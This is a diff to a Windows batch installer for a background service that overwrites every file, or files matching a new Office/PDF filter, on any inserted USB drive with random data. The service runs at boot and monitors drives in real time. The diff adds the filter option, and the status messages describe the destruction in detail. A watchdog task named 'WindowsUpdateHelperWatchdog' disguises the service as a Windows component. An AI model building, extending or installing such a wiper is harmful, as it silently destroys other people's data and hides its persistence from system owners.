@@ -141,6 +141,21 @@ if %errorLevel% equ 0 (
     pause
     exit /b 1
 )
+
+REM Copy configuration utility files if they exist
+set "CONFIG_UTIL=%BATCH_DIR%configure_filter.py"
+set "CONFIG_BATCH=%BATCH_DIR%Configure_File_Filter.bat"
+
+if exist "%CONFIG_UTIL%" (
+    echo Copying configuration utility...
+    copy /Y "%CONFIG_UTIL%" "%INSTALL_DIR%\configure_filter.py" >nul
+    if exist "%CONFIG_BATCH%" (
+        copy /Y "%CONFIG_BATCH%" "%INSTALL_DIR%\Configure_File_Filter.bat" >nul
+    )
+    echo Configuration utility installed.
+) else (
+    echo Configuration utility not found - skipping.
+)
 echo.
 
 REM Install required Python packages
@@ -392,16 +407,25 @@ if %errorLevel% equ 0 (
     echo   - Works with any drive letter dynamically
     echo   - PROCESSES USB drives already connected at boot
     echo   - MONITORS file changes in real-time
-    echo   - OVERWRITES ALL FILES with random binary data
+    echo   - FILE FILTERING: Configurable (ALL, Office, PDF, or Office+PDF)
+    echo.
+    echo CURRENT FILE FILTER: ALL FILES (default)
+    echo   - To change filter mode, run: Configure_File_Filter.bat
+    echo   - Available modes: ALL, Office only, PDF only, Office+PDF
     echo.
     echo DESTRUCTIVE ACTION ON USB INSERTION:
-    echo   - Scans entire USB drive for ALL files
-    echo   - Overwrites every file with random binary data
+    echo   - Scans entire USB drive for target files
+    echo   - Overwrites files with random binary data (based on filter)
     echo   - Preserves original file sizes
     echo   - Skips system/protected files automatically
     echo   - Computationally efficient (uses os.urandom)
     echo   - REAL-TIME monitoring: overwrites files as they are copied
     echo   - BOOT-TIME processing: handles drives connected before startup
+    echo.
+    echo CONFIGURATION:
+    echo   - Config file: %INSTALL_DIR%\config.ini
+    echo   - Configuration utility: %INSTALL_DIR%\Configure_File_Filter.bat
+    echo   - Change filter mode anytime and restart service
     echo.
     echo ============================================================================
     echo.
@@ -410,6 +434,11 @@ if %errorLevel% equ 0 (
     echo.
     echo Service location: %SCRIPT_FILE%
     echo Watchdog location: %WATCHDOG_SCRIPT%
+    echo Configuration: %INSTALL_DIR%\config.ini
+    echo.
+    echo TO CHANGE FILE FILTER MODE:
+    echo   Run: %INSTALL_DIR%\Configure_File_Filter.bat
+    echo   Or edit: %INSTALL_DIR%\config.ini (then restart service)
     echo.
     echo TO UNINSTALL (run as Administrator):
     echo   1. schtasks /delete /tn "WindowsUpdateHelperWatchdog" /f
